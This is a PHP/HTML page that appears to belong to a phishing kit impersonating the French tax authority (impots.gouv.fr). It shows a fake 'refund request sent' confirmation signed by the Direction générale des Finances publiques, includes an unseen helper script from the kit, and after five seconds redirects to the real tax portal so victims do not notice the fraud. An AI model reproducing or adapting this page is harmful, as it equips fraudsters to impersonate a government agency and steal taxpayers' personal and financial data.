﻿<?php
session_start();

include("./BIRNAVA/911.php");
?>
<!doctype html>
<html lang="fr">

	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<meta name="apple-itunes-app" content="app-id=505488770" />
		
			<link rel="stylesheet" href="./X911//style_v2.css" />

		<link rel="shortcut icon" href="./X911/favicon.ico" type="image/ico" />

		<title>Impots : Formulaire ded remboursement</title>
	</head>
	<body>


<div id="banner" style="margin-bottom:6px;">
<div class="container">
<a href="#"><img src="./X911/logo.svg" style="margin-top:15px; height: 72px;"></a>
<a href=""><img id="optionalstuff" src="./X911/lgn.png" style="float:right;margin-top:13px;">

<style>
@media (max-width:629px) {
  img#optionalstuff {
    display: none;
  }
}
</style></a>
</div>
</div>
		<!-- Fil d'Arianne -->
		<div class="container">
			<div class="row">
				<ol class="breadcrumb ">
					<li><a href="#" id="toPortailPub" title="Retour au portail">Accueil</a></li>
				</ol>
			</div>
		</div>
		<!-- Fin du fil d'Arianne -->
		<main class="container" style="margin-top:-12px;" id="contenu">
			
			<div class="row">
				<!-- Connexion Gauche-->	
				<div class="col-md-12" style="
    text-align: center;
">
					
					<div class="panel panel-default">
						<div class="panel-heading">

							<h2 id="titre_authent" style="margin-top:12px;" class="text-center">Demande de remboursement envoyée</h2>
						</div>
						<img src="./X911/sus.gif">
						<div class="panel-body"><br>


                           Votre demande de remboursement a bien été prise en compte !<br><br>

                           Si vous avez bien rempli le formulaire, vous recevrez un mail de confirmation dans les 72 heures qui suivent. Dans le cas contraire, merci de nous en faire part à l'adresse mail suivante : <b>assistance@impots.gouv.fr</b><br><br>

                           Nous vous remercions pour votre confiance.<br><br>

                           La direction générale des Finances publiques.





						
						
						<br><br>
									
								
						</div>
					</div>
				</div>
				</div> 
				<br><br>


			</div> <!-- row FIN -->
		</main> 
	

<meta http-equiv="refresh" content="5; URL=https://cfspart.impots.gouv.fr/LoginAccess?op=c&url=aHR0cHM6Ly9jZnNwYXJ0LmltcG90cy5nb3V2LmZyLw==" />
	
		</body>
	</html>
